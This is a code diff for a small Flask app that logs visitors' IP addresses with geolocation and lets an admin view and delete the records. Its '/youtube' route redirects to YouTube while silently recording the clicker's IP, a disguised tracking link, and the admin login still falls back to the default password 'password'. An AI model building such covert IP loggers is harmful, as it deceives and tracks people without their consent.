@@ -4,6 +4,7 @@ from models import Visit
 from datetime import datetime
 import requests
 import logging
+import os
 
 
 def get_client_ip():
@@ -41,7 +42,6 @@ def index():
     """Show visitor their IP address"""
     try:
         client_ip = get_client_ip()
-        # Record the visit
         record_visit(client_ip)
         return render_template('index.html', ip_address=client_ip)
     except Exception as e:
@@ -54,27 +54,22 @@ def index():
 def youtube():
     """Redirect to YouTube and silently record the IP"""
     try:
-        # Record the visit in the background
         record_visit(get_client_ip())
     except Exception as e:
         app.logger.error(f"Error recording IP: {str(e)}")
 
-    # Redirect immediately without showing any intermediate page
     return redirect("https://youtube.com")
 
 
 def record_visit(client_ip):
     """Record or update a visit in the database"""
     try:
-        # Check if IP exists
         visit = Visit.query.filter_by(ip_address=client_ip).first()
 
         if visit:
-            # Update existing visit
             visit.visit_count += 1
             visit.last_visit = datetime.utcnow()
         else:
-            # Create new visit and get geolocation
             geo_data = get_geolocation(client_ip)
             visit = Visit(ip_address=client_ip,
                           country=geo_data.get('country'),
@@ -91,12 +86,13 @@ def record_visit(client_ip):
         return False
 
 
-# Admin login
 @app.route('/admin/login', methods=['GET', 'POST'])
 def admin_login():
     error = None
+    admin_password = os.getenv("PASSWORD", "password")
+    
     if request.method == 'POST':
-        if request.form['password'] == 'password':
+        if request.form['password'] == admin_password:
             session['admin_logged_in'] = True
             return redirect(url_for('admin_visits'))
         else:
@@ -105,14 +101,12 @@ def admin_login():
     return render_template('admin/login.html', error=error)
 
 
-# Admin logout
 @app.route('/admin/logout')
 def admin_logout():
     session.pop('admin_logged_in', None)
     return redirect(url_for('admin_login'))
 
 
-# Protected admin visits page
 @app.route('/admin/visits')
 def admin_visits():
     if not session.get('admin_logged_in'):
@@ -122,7 +116,6 @@ def admin_visits():
     return render_template('admin/visits.html', visits=visits)
 
 
-# Delete selected visits
 @app.route('/admin/delete-visits', methods=['POST'])
 def admin_delete_visits():
     if not session.get('admin_logged_in'):
@@ -134,7 +127,6 @@ def admin_delete_visits():
         return redirect(url_for('admin_visits'))
 
     try:
-        # Delete selected visits
         deleted_count = 0
         for visit_id in selected_visits:
             visit = Visit.query.get(visit_id)
